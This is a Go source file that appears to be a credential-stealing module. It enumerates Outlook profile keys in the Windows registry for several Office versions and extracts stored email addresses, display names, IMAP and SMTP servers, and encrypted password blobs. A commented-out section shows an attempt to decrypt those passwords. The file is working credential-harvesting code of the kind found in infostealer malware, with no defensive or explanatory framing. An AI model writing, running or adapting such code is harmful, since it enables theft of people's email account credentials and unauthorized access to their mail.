package outlook

import (
	"errors"
	"fmt"
	"golang.org/x/sys/windows/registry"
	"log"
	"strings"
)

//structure for returning extracted data
type ExtractedData struct {
	SMTP     string
	IMAP     string
	Email    string
	Name     string
	Password []byte
}

//function to get a list of registry subfolders
func getSubkeys(path string) ([]string, int, bool) {
	k, err := registry.OpenKey(registry.CURRENT_USER, path, registry.ENUMERATE_SUB_KEYS)
	if err != nil {
		log.Println(err)
		return nil, 0, false
	}
	defer k.Close()

	kSubkeys, errRead := k.ReadSubKeyNames(-1)
	if errRead != nil {
		log.Println(errRead.Error())
		return nil, 0, false
	}

	return kSubkeys, len(kSubkeys), true
}

//function to get a list of registry data from a subfolder
func enumerateValues(path string) []string {
	k, err := registry.OpenKey(registry.CURRENT_USER, path, registry.QUERY_VALUE)
	if err != nil {
		log.Println(err)
	}
	defer k.Close()

	values, _ := k.ReadValueNames(-1)
	return values
}

//function to extract a binary value from registry data
func ExtractValues(path string, name string) (binValues []byte, errors error) {
	g, err := registry.OpenKey(registry.CURRENT_USER, path, registry.QUERY_VALUE|registry.READ)
	//fmt.Println("PATH --> ", path + `\` + name)
	if err != nil {
		fmt.Println(err)
	}
	defer g.Close()

	binValues, _, err = g.GetBinaryValue(name)
	if err != nil {
		fmt.Println(err)
	}
	//fmt.Println("Binary data of ", name, "--> ", binValues)

	return binValues, err
	/* function Win32CryptUnprotectData does not work quite right
	str_pass := string(bin_pass)
	fmt.Println("STR PASS --> ")
	fmt.Println(str_pass)

	values = common.Win32CryptUnprotectData(str_pass, false)
	*/
}

func OutlookRun() (Credentials []ExtractedData, err error) {
	baseRegistryPaths := []string{`Software\Microsoft\Office\15.0\Outlook\Profiles\Outlook`,
		`Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles\Outlook`,
		`Software\Microsoft\Windows Messaging Subsystem\Profiles`,
		`Software\Microsoft\Office\16.0\Outlook\Profiles\Outlook`} //Registry paths for different versions of Outlook

	var AllValues []ExtractedData
	for _, path := range baseRegistryPaths {

		var err error
		mainSubkeys, _, status := getSubkeys(path)
		if status == false {
			log.Panic("error")
			err = errors.New("Can't get SubKeys at " + path)
			return nil, err
		}

		for _, value := range mainSubkeys {
			//fmt.Println(value)
			subkeys, _, status := getSubkeys(path + "\\" + value)
			if status == false {
				log.Panic("error")
				err = errors.New("Can't get SubKeys at " + path + "\\" + value)
			}

			//fmt.Println("\tSubkeys len", subkeys, length)

			for _, subkey := range subkeys {
				var values ExtractedData
				fmt.Println("\t" + subkey)
				subKeyValues := enumerateValues(path + `\` + value + `\` + subkey)

				for _, name := range subKeyValues {
					//fmt.Println("\t\t" + name)
					if strings.Contains(name, "Password") {
						password, err := ExtractValues(path+`\`+value+`\`+subkey+`\`, name)
						if err != nil {
							log.Panic(err)
						}
						values.Password = password
						//fmt.Println(password)

					}
					if strings.Contains(name, "IMAP Server") {
						server, err := ExtractValues(path+`\`+value+`\`+subkey+`\`, name)
						if err != nil {
							fmt.Println(err)
						}
						values.IMAP = string(server)
						//fmt.Println(string(server))
					}
					if strings.Contains(name, "SMTP Server") {
						server, err := ExtractValues(path+`\`+value+`\`+subkey+`\`, name)
						if err != nil {
							fmt.Println(err)

						}
						values.SMTP = string(server)
						//fmt.Println(string(server))
					}
					if strings.Contains(name, "Email") {
						mail, err := ExtractValues(path+`\`+value+`\`+subkey+`\`, name)
						if err != nil {
							fmt.Println(err)
						}
						values.Email = string(mail)
						//fmt.Println(string(mail))
					}
					if strings.Contains(name, "Display Name") {
						name, err := ExtractValues(path+`\`+value+`\`+subkey+`\`, name)
						if err != nil {
							fmt.Println(err)
						}
						values.Name = string(name)
						//fmt.Println(string(mail))
					}
				}
				//fmt.Println(subkey, " - ", values)
				AllValues = append(AllValues, values)
				//fmt.Println(AllValues)
			}

		}
	}
	return AllValues, err
}
